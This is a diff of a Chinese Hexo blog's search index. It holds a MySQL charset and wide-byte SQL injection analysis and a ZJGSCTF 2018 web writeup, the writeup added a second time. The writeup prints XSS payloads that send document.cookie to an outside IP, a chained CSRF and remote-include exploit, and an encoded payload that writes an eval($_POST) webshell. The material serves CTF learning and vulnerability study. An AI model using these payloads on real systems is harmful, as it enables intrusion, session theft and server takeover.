@@ -3,16 +3,20 @@
   
     
     <entry>
-      <title></title>
-      <url>/2018/05/11/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/</url>
-      <content type="html"><![CDATA[<h1 id="mysql字符集漏洞"><a href="#mysql字符集漏洞" class="headerlink" title="mysql字符集漏洞"></a>mysql字符集漏洞</h1><p>此篇将介绍两种有关mysql字符集的漏洞。<br>一者是 <strong>字符集转换漏洞</strong> ———— 因为字符集不同 躲过关键词过滤  进入mysql后产生的截断 恢复关键词查询</p>
-<p>一者是 <strong>宽字节注入</strong> ———— 因为字符集不同 躲过SQL注入过滤函数addslashes()  使addslashes过滤的单引号、双引号、反斜杠、NULL 可以利用，从而绕过SQL注入防护，达成SQL注入  </p>
+      <title><![CDATA[Mysql-字符集漏洞分析]]></title>
+      <url>/2018/05/06/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/</url>
+      <content type="html"><![CDATA[<p>— Mysql字符集漏洞 —<br>—  PHP 字符集漏洞  —<br><a id="more"></a></p>
+<h1 id="mysql字符集漏洞"><a href="#mysql字符集漏洞" class="headerlink" title="mysql字符集漏洞"></a>mysql字符集漏洞</h1><p>此篇将介绍两种有关mysql字符集的漏洞,再提及一点类似原理的PHP字符集。</p>
+<ul>
+<li>一者是 <strong>字符集转换漏洞</strong> ———— 因为字符集不同 躲过关键词过滤  进入mysql后产生的截断 恢复关键词查询</li>
+<li>一者是 <strong>宽字节注入</strong> ———— 因为字符集不同 躲过SQL注入过滤函数<strong>addslashes()</strong>使addslashes过滤的单引号、双引号、反斜杠、NULL 可以利用，从而绕过SQL注入防护，达成SQL注入  </li>
+</ul>
 <p>在介绍这两种漏洞之前，先介绍一些Mysql语句</p>
 <h2 id="Mysql语句"><a href="#Mysql语句" class="headerlink" title="Mysql语句"></a>Mysql语句</h2><h3 id="查看字符集"><a href="#查看字符集" class="headerlink" title="查看字符集"></a>查看字符集</h3><p>查看Mysql中的字符集设置<br><code>show variables like &#39;character_set_%&#39;</code></p>
 <h3 id="设置客户端字符集"><a href="#设置客户端字符集" class="headerlink" title="设置客户端字符集"></a>设置客户端字符集</h3><p>在php中，常用以下语句来设置php客户端在Mysql中的字符集<br><code>set names utf8</code><br>这个语句会修改如下几项客户端设置<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">character_set_client=utf8</div><div class="line">character_set_connection=utf8</div><div class="line">character_set_results=utf8</div></pre></td></tr></table></figure></p>
 <p>然而如下服务端设置不会修改<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">character_set_database</div><div class="line">character_set_server</div><div class="line">character_set_filesysytem</div><div class="line">character_set_system</div></pre></td></tr></table></figure></p>
-<p>这样就造成了 服务端与客户端 不匹配<br>从而会造成<strong>字符集转换漏洞</strong></p>
-<p>而当设置的客户端字符集为GBK时，即<code>set names gbk</code><br>(此处以GBK作为典范，但不只是GBK会产生宽字节注入，之后细说)<br>从而会造成<strong>宽字节注入</strong></p>
+<p>这样就造成了 服务端与客户端 不匹配<br>从而会造成 <strong>字符集转换漏洞</strong></p>
+<p>而当设置的客户端字符集为GBK时，即<code>set names gbk</code><br>(此处以GBK作为典范，但不只是GBK会产生宽字节注入，之后细说)<br>从而会造成 <strong>宽字节注入</strong></p>
 <p>下面说明字符集转换漏洞</p>
 <h2 id="Mysql字符集转换漏洞"><a href="#Mysql字符集转换漏洞" class="headerlink" title="Mysql字符集转换漏洞"></a>Mysql字符集转换漏洞</h2><blockquote>
 <p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。<br>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
@@ -43,7 +47,7 @@
 <blockquote>
 <p>Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节<br>utf8mb4编码才是包含完整的UTF8</p>
 </blockquote>
-<p>所以s，对于类似的绕过利用</p>
+<p>所以，对于类似的绕过利用</p>
 <ul>
 <li>对于UTF8，可以利用第一个字节范围<code>[00-7F] [C2-EF]</code></li>
 <li>对于UTF8mb4，可以利用第一个字节范围<code>[00-7F] [C2-F4]</code></li>
@@ -88,7 +92,7 @@
 <li>character_set_client设置为binary<br><code>SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary</code></li>
 <li>不使用mysql函数调用数据库，使用mysqli或PDO</li>
 </ul>
-<h2 id="类似漏洞原理的php中的iconv"><a href="#类似漏洞原理的php中的iconv" class="headerlink" title="类似漏洞原理的php中的iconv"></a>类似漏洞原理的php中的iconv</h2><p>很多cms会将接收到数据，调用这样一个函数，转换其编码：<br><code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code><br><code>iconv(&#39;gbk&#39;, &#39;utf-8&#39;, $_GET[&#39;word&#39;]);</code><br>目的一般是为了避免乱码，特别是在搜索框的位置，这样子的字符集转换，也会有着类似的<strong>字符集转换漏洞</strong>。<br>关键源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>,$conn) <span class="keyword">OR</span> emMsg(<span class="string">'链接数据库失败'</span>);</div><div class="line">mysql_query(<span class="string">"SET character_setconnection=gbk,character_set_results=gbk,character_set_client=binary"</span>,$conn);</div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>] ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$id = iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$id);</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div></pre></td></tr></table></figure></p>
+<h1 id="类似漏洞原理的php中的iconv"><a href="#类似漏洞原理的php中的iconv" class="headerlink" title="类似漏洞原理的php中的iconv"></a>类似漏洞原理的php中的iconv</h1><p>很多cms会将接收到数据，调用这样一个函数，转换其编码：<br><code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code><br><code>iconv(&#39;gbk&#39;, &#39;utf-8&#39;, $_GET[&#39;word&#39;]);</code><br>目的一般是为了避免乱码，特别是在搜索框的位置，这样子的字符集转换，也会有着类似的<strong>字符集转换漏洞</strong>。<br>关键源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>,$conn) <span class="keyword">OR</span> emMsg(<span class="string">'链接数据库失败'</span>);</div><div class="line">mysql_query(<span class="string">"SET character_setconnection=gbk,character_set_results=gbk,character_set_client=binary"</span>,$conn);</div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>] ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$id = iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$id);</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div></pre></td></tr></table></figure></p>
 <p>可以看到<code>character_set_client=binary</code>已经进行宽字节注入的防护<br>试试能不能通过<code>iconv</code>绕过addslashes</p>
 <h3 id="iconv-‘utf-8’-‘gbk’-GET-‘id’"><a href="#iconv-‘utf-8’-‘gbk’-GET-‘id’" class="headerlink" title="iconv(‘utf-8’, ‘gbk’, $_GET[‘id’])"></a>iconv(‘utf-8’, ‘gbk’, $_GET[‘id’])</h3><blockquote>
 <p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。</p>
@@ -105,18 +109,26 @@
 <p>那么假如反过来呢</p>
 <h3 id="iconv-‘gbk’-‘utf-8’-GET-‘id’"><a href="#iconv-‘gbk’-‘utf-8’-GET-‘id’" class="headerlink" title="iconv(‘gbk’, ‘utf-8’, $_GET[‘id’])"></a>iconv(‘gbk’, ‘utf-8’, $_GET[‘id’])</h3><p>相同的环境，编码转换反过来，可以利用这个语句来绕过addslashes过滤么</p>
 <p>这个利用原理就跟<code>宽字节注入</code>一模一样了吧，只是一个转换是在Mysql中，一个转换是在PHP中而已。<br>直接<code>%df&#39;</code>-&gt;<code>%df/&#39;</code>-&gt;<code>%df%5c%27</code><br>在iconv gbk 变成 utf-8时，会把<code>%df%5c</code>当做一个字符，转化成utf8编码的该字符，从而形成<code>%27</code>单引号逃逸</p>
-<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>尽管是一些比较老的漏洞了，一个PDO预编译+同一字符集就可以解决问题<br>但是也算是给自己在<strong>字符集转换漏洞</strong>上面理解了个大概。</p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>尽管是一些比较老的漏洞了，一个PDO预编译+同一字符集就可以解决问题<br>但是也算是给自己在<strong>字符集转换漏洞</strong>上面理解了个大概。</p>
 <p>理解各个字符集对于16进制数据的处理是很关键的，何时当做单字节字符，何时当做多字节字符，边界16进制范围是多少等。<br>当弄清楚这些时，去发掘字符集漏洞应该也有些许头绪了。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a><br>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a><br>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
 ]]></content>
       
+        
+        <tags>
+            
+            <tag> Mysql </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+        </tags>
         
     </entry>
     
     <entry>
       <title><![CDATA[ZJGSCTF-2018-web writup]]></title>
       <url>/2018/05/06/ZJGSCTF-2018-writeup/</url>
-      <content type="html"><![CDATA[<p>— ZJGSCTF 2018 —<br>—     web部分   —<br><a id="more"></a></p>
+      <content type="html"><![CDATA[<p>— ZJGSCTF 2018 —<br>—  web writeup —<br><a id="more"></a></p>
 <h2 id="给你的小世界"><a href="#给你的小世界" class="headerlink" title="给你的小世界"></a>给你的小世界</h2><p>好好地弄了下页面，编了个故事，抄了点情书，个人感觉还是挺好滴。</p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr47td0na2j30vp0eyaaw.jpg" alt="1.png"><br></div>
 
@@ -248,6 +260,125 @@
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg" alt=""><br></div>
 
 <h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>太特喵的累了….把能想到的问题一一尝试，全部解决了….也算是把白猪老哥的题弄清楚了….花了好长好长时间呜呜,溜了溜了qaq</p>
+<h2 id="小姐姐小姐姐，你听我说噢-1"><a href="#小姐姐小姐姐，你听我说噢-1" class="headerlink" title="小姐姐小姐姐，你听我说噢"></a>小姐姐小姐姐，你听我说噢</h2><p>感谢白猪老哥赞助的题目</p>
+<h3 id="admin-view-php-1"><a href="#admin-view-php-1" class="headerlink" title="admin/view.php"></a>admin/view.php</h3><p>有全部的源码。<br>先来看<code>admin/view.php</code>，这里可以了解到我们进不去的admin用户在做什么</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorly5xb6j30b502edfs.jpg" alt="wp6.png"><br></div>
+
+<p>这个页面是会3秒刷新一次，形成不断查看用户提交信息的行为。<br>之后会从数据库中原原本本读出用户提交的东西，显示在<code>&lt;div&gt;</code>标签内<br>截取一个在服务端形成的页面帮助理解标签构造(自己在本地也可以通过源码自己架构网站来实现查看)</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorn8iil5j30gx04ejr9.jpg" alt="wp7.png"><br></div>
+
+<p>可见这个地方是可以闭合标签形成XSS的，在<code>contact.php</code>中向admin用户发送payload</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqornu65xxj30p30a5753.jpg" alt="wp8.png"><br></div>
+
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqoro4akhgj30qe03iq2r.jpg" alt="wp9.png"><br></div>
+
+<p>尝试得到XSS<br>payload:<code>&lt;/div&gt; &lt;script&gt;window.location.href=&#39;http://45.63.17.127:12345/cookie.asp?msg=&#39;+document.cookie&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorofz8caj30ig058jrp.jpg" alt="wp10.png"><br></div>
+
+<p>失败<br>因为这里服务端<strong>PHP.INI</strong>设置了<code>session.cookie_httponly=On</code><br>如果没有设置的情况<br>换一个payload如下(两个payload效果是一样的)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;/div&gt; &lt;script&gt;var img = document.createElement(&apos;img&apos;);</div><div class="line">img.width = 0;</div><div class="line">img.height = 0;</div><div class="line">img.src = &apos;http://45.63.17.127:12345/a.php?joke=&apos;+document.cookie;&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</div></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorov86w6j30if05mq3d.jpg" alt="wp11.png"><br></div>
+
+<p>至此我们可以发现提交意见框存在XSS漏洞，也就是我们可以在admin用户的网页内执行任意前端代码，包括让admin用户去访问我们制定的网站，除了无法获得用户的cookie。</p>
+<blockquote>
+<p>ps.获得cookie是xss其中最经典的用法，xss还有其他很多利用方法，比如构造虚假页面欺骗admin用户，但在这题目中都没有利用余地，admin用户，只是打开了网页自动一直在刷新查阅消息</p>
+</blockquote>
+<h3 id="SERVER-‘SCRIPT-NAME’-漏洞-1"><a href="#SERVER-‘SCRIPT-NAME’-漏洞-1" class="headerlink" title="$_SERVER[‘SCRIPT_NAME’]漏洞"></a>$_SERVER[‘SCRIPT_NAME’]漏洞</h3><p>继续搜寻其他漏洞<br>查看<code>index.php</code>源码，发现其他所有js/css都是用静态位置表示对应css,js位置</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorphwnzbj30ii03lmxh.jpg" alt="wp1.png"><br></div>
+
+<p>只有这个地方使用<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>来获取当前网站位置</p>
+<blockquote>
+<p><strong>$_SERVER[‘SCPIPT_NAME’]</strong>在小于等于PHP5的版本里，会成为一个漏洞函数，它的触发还与APACHE的版本以及windows/linux系统有关。详情请见PHP漏洞函数分析一文。</p>
+</blockquote>
+<p>进行测试</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorpo4b79j30ga09j3ym.jpg" alt="wp2.png"><br></div>
+
+<p>发现成功对返回的页面进行修改，尝试是否可以进一步利用。<br>payload:<code>&quot;&gt; &lt;/a&gt; 1 &lt;a  href=&quot;</code><br>形成以下构造<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//index.php "</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> 1 <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-default"</span>&gt;</span>Current Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorq32nyrj30ko05iglp.jpg" alt="wp3.png"><br></div>
+
+<p>payload:<code>&quot;&gt; &lt;/a&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;a  href= /</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorqf44xyj30kz09x0td.jpg" alt="wp4.png"><br></div>
+
+<p>可以发现，形成<strong>反弹XSS</strong><br>由于我们之前已经从<code>contact.php</code>得到了XSS，转而找其他的思路——<strong>嵌入后端代码</strong></p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorqpj4ssj30wi03vdgk.jpg" alt="wp16.png"><br></div>
+
+<p>我们可以看见嵌入php代码是成功的，但是它只会返回到页面上，不会再后端执行。</p>
+<p>此处必须说明关于 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 的另一个要点：<strong>只接受URL编码的值</strong><br>在该函数提取的URL中如果有特殊符号没有被URL加密过，就会直接舍弃全部</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrb3y58j30uz0750tn.jpg" alt="wp12.png"><br></div>
+
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorreey1yj30rp06gaat.jpg" alt="wp13.png"><br></div>
+
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorrhdembj30vj07awfc.jpg" alt="wp14.png"><br></div>
+
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrkmyc0j30uv07tjs8.jpg" alt="wp15.png"><br></div>
+
+<p>还不接受burpsuite的+代替空格的URL编码</p>
+<blockquote>
+<p>ps.之前在hackbar中的数据实际上在发送前会被URL加密一次。<br>经过hackbar发送的请求，自动URL加密GET参数，不自动URL加密POST参数</p>
+</blockquote>
+<h3 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><code>/admin/index.php</code> 有一处显而易见的远程文件包含<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span> <span class="string">"http://localhost/"</span>.$_GET[<span class="string">'path'</span>];</div></pre></td></tr></table></figure></p>
+<p>此处<strong>include</strong>会执行一次访问 “<a href="http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果" target="_blank" rel="external">http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果</a> 中的PHP代码<br>而在访问本地地址的时候会再解析一次，也就是这句话会把path指定的页面解析两次。<br>无法理解的话，请参考<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="external">lfi与rfi</a></p>
+<p>但是由于之前有<code>check()</code>验证cookie。而我们不是admin用户，没法利用</p>
+<p>同时这个页面，admin访问的话没有阻碍，即存在CSRF。</p>
+<h3 id="组合所有漏洞-1"><a href="#组合所有漏洞-1" class="headerlink" title="组合所有漏洞"></a>组合所有漏洞</h3><p>我们知道可以通过联系admin用户的输入框控制admin界面的前端页面，此处可以嵌入<code>&lt;img src= /&gt;</code>让admin用户自动访问任意网站，形成csrf<br>我们知道可以通过<code>/admin/index.php</code>的本地文件包含，包含执行对方服务器本地存在的代码。<br>我们知道可以在<code>index.php</code>中嵌入任意php代码</p>
+<p>于是一套COMBO就连成了。<br>通过<strong>输入框</strong>控制admin用户去访问<strong>/admin/index.php</strong>。在其<code>参数path</code>中让<strong>include包含</strong>被我们注入php代码的漏洞页面<strong>index.php/xxxxx</strong></p>
+<h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>由于我们需要看到php执行的结果，把结果写入test.php文件夹中。<br>构造php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">fwrite(fopen(<span class="string">'test.php'</span>,<span class="string">'w+'</span>),<span class="string">"&lt;?php var_dump(glob('*'));?&gt;"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>第二，由于上面我们发现<strong>$_SERVER[‘SCPIPT_NAME’]</strong>注入php代码，需要保证php代码URL编码一次<br>计算我们此处payload需要URL编码的次数，顺便理清楚执行过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">输入框内编码x次 加上 发送浏览器自动编码<span class="number">1</span>次 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">admin用户页面查看view页面 数据提取出数据库，原样显示到view.php页面形成图片</div><div class="line">加上 admin用户在view.php通过浏览器自动访问 服务器/admin/index.php?path=xx 页面 发送浏览器自动编码<span class="number">1</span>次</div><div class="line">减去 服务器接受请求自动解码<span class="number">1</span>次</div><div class="line">因为PATH参数 远程<span class="keyword">include</span> http:<span class="comment">//localhost/index.php/xxxxxx  #此处的xxx需要剩2次编码</span></div><div class="line">服务器 远程请求 服务器自己 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">$_SERVER[<span class="string">'SCPIPT_NAME'</span>] 需要保证URL编码<span class="number">1</span>次</div></pre></td></tr></table></figure>
+<p>所以得出 在输入框内 需要对php内容进行2次编码</p>
+<p><strong>构造payload</strong></p>
+<blockquote>
+<p>初始payload:查看当前目录下所有文件，包括文件夹下内容<br><code>&lt;img src=http://10.21.13.225/admin/index.php?path=index.php/&lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&quot;&lt;?php var_dump(glob(&#39;*&#39;));?&gt;&quot;);?&gt; /&gt;</code></p>
+</blockquote>
+<p><code>&lt;img /&gt;</code> 等内容在admin用户 前端界面显示，所以这里不用URL加密</p>
+<blockquote>
+<p>对于 path=index.php/ 之后  /&gt; 之前，需要进入到最终 进行两次编码<br><code>&lt;img src=http://10.21.13.225/admin/index.php?</code><br><code>path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.</code><br><code>php%2527%252C%2527w%252b%2527%2529%252C%2522%253C%253Fphp%2520var_dump%2528glob%2528%252</code><br><code>7%252a%2527%2529%2529%253B%253F%253E%2522%2529%253B%253F%253E3%2520/&gt;</code>（此处为了显示，有换行）</p>
+</blockquote>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorrtn1j5j30qx02xgln.jpg" alt="wp17.png"><br></div>
+
+<p>成功，但是没有发现，既然可以写入文件，就写入web-shell吧</p>
+<h3 id="关于webshell-payload的细节分析-1"><a href="#关于webshell-payload的细节分析-1" class="headerlink" title="关于webshell-payload的细节分析"></a>关于webshell-payload的细节分析</h3><ul>
+<li>web-shell1：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;);</code></li>
+</ul>
+<p>但是<code>&quot;&lt;?php $_POST ?&gt;&quot;</code>双引号会对里面的 $_POST 进行解析,就没法原原本本写入</p>
+<ul>
+<li>web-shell2：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[\&#39;cmd\&#39;]);?&gt;&#39;);</code></li>
+</ul>
+<p>用单引号，内部对单引号要用\注释，如<code>\&#39;</code><br>但是在访问admin/index.phpURL解码一次，访问index.php时，URL编码的<code>\ -&gt; %5C</code>会被解析成目录路径，从而失败</p>
+<ul>
+<li>web-shell3：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;);</code></li>
+</ul>
+<p>考虑不使用<code>$_POST[\&#39;cmd\&#39;]</code>使用<code>$_POST[cmd]</code>，这种写法虽然会NOICE提醒错误，但是也可以使用<br>测试可行，还有更好的</p>
+<ul>
+<li>webshell_final：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);</code></li>
+</ul>
+<p>fwrite函数写入内容，外单引号，内双引号</p>
+<blockquote>
+<p>payload:<br><code>&lt;img src=http://10.21.13.225/admin/index.php?path=index.php/12&lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;3 /&gt;</code><br>finally:<br><code>&lt;img src=http://10.21.13.225/admin/index.php?</code><br><code>path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.</code><br><code>php%2527%252C%2527w%252b%2527%2529%252C%2527%253C%253Fphp%2520eval%2528%2524_POST</code><br><code>%255B%2522cmd%2522%255D%2529%253B%253F%253E%2527%2529%253B%253F%253E3%2520/&gt;</code>（此处为了显示，有换行）</p>
+</blockquote>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqortix4e5j30pn091t98.jpg" alt="wp18.png"><br></div>
+
+<p>接入菜刀/蚁剑，密码为shell中post参数</p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqosh707b2j30cl09pmxc.jpg" alt="wp19.png"><br></div>
+
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqoslgjlsaj30al02swef.jpg" alt="wp20.png"><br></div>
+
+<h3 id="view-php的XSS攻击-为何与-include无法结合-1"><a href="#view-php的XSS攻击-为何与-include无法结合-1" class="headerlink" title="view.php的XSS攻击 为何与 include无法结合"></a>view.php的XSS攻击 为何与 include无法结合</h3><p>也可能会有人思考到，view页面有XSS，向view页面写入php代码，在让admin用户去包含view页面这样。<br>如下payload</p>
+<blockquote>
+<p><code>&lt;/div&gt; &lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;123&#39;);?&gt; &lt;div class=&quot;panel-body&quot;&gt; &lt;img src=http://10.21.13.225/admin/index.php?path=admin/index.php?path=view/&gt;</code></p>
+</blockquote>
+<p>事实是 不可以的。<br>admin用户去访问<code>/admin/index.php</code>会让服务器去访问<code>/admin/index.php?path=view</code><br>但是服务器在访问<code>/admin/index.php</code>的时候不能通过<code>check验证</code><br>所以就没法包含进view页面的php代码。</p>
+<p>那如果admin用户是在服务端的浏览器查看的，可不可以呢，也是不可以的。<br>include 远程文件 是不能包含cookie的</p>
+<h2 id="永恒之蓝-1"><a href="#永恒之蓝-1" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>以下writeup来自betamao:</p>
+<h3 id="发现-1"><a href="#发现-1" class="headerlink" title="发现"></a>发现</h3><p>使用nmap扫描发现开了443端口，为windows服务器，还开了明显被永恒之蓝入侵的端口：</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr57hg3d27j30w00bswg6.jpg" alt=""><br></div>
+
+<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>使用metasploit扫描果然存在漏洞：</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fr57huj9wij314f084q2y.jpg" alt=""><br></div>
+
+<p>直接攻击得到shell</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg" alt=""><br></div>
+
+<h2 id="后言-1"><a href="#后言-1" class="headerlink" title="后言"></a>后言</h2><p>太特喵的累了….把能想到的问题一一尝试，全部解决了….也算是把白猪老哥的题弄清楚了….花了好长好长时间呜呜,溜了溜了qaq</p>
 ]]></content>
       
         
